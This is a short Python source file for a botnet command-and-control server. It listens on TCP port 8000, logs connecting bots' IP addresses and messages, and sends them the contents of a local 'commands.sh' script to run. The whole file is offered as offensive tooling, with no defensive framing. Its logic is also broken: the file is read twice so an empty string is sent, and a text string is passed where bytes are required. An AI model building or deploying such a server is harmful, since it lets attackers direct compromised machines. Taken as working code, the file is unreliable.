# CNC server which control multiple bots

import socketserver

# Each connection is associated with its own BotHandler class
class BotHandler(socketserver.BaseRequestHandler):
    # Called whenever BotHandler receives data from a client
    def handle(self):
        self.data = self.request.recv(1024).strip() # Contains the data from the request
        print("Bot with IP {} sent: ".format(self.client_address[0])) # Tuple with the client's IP address and port number
        print(self.data)

        # Sends to the client all the information passed
        f = open("commands.sh", "r")
        print(f.read())
        self.request.sendall(f.read())

if __name__ == "__main__":
    HOST, PORT = "", 8000
    # Create a TCP server
    # When a client connects to the server, creates a new internal thread and instantiates a new BotHandler class
    tcpServer = socketserver.TCPServer((HOST, PORT), BotHandler)
    try:
        # Server will run until it is terminated
        tcpServer.serve_forever()
    except:
        print("There was an error")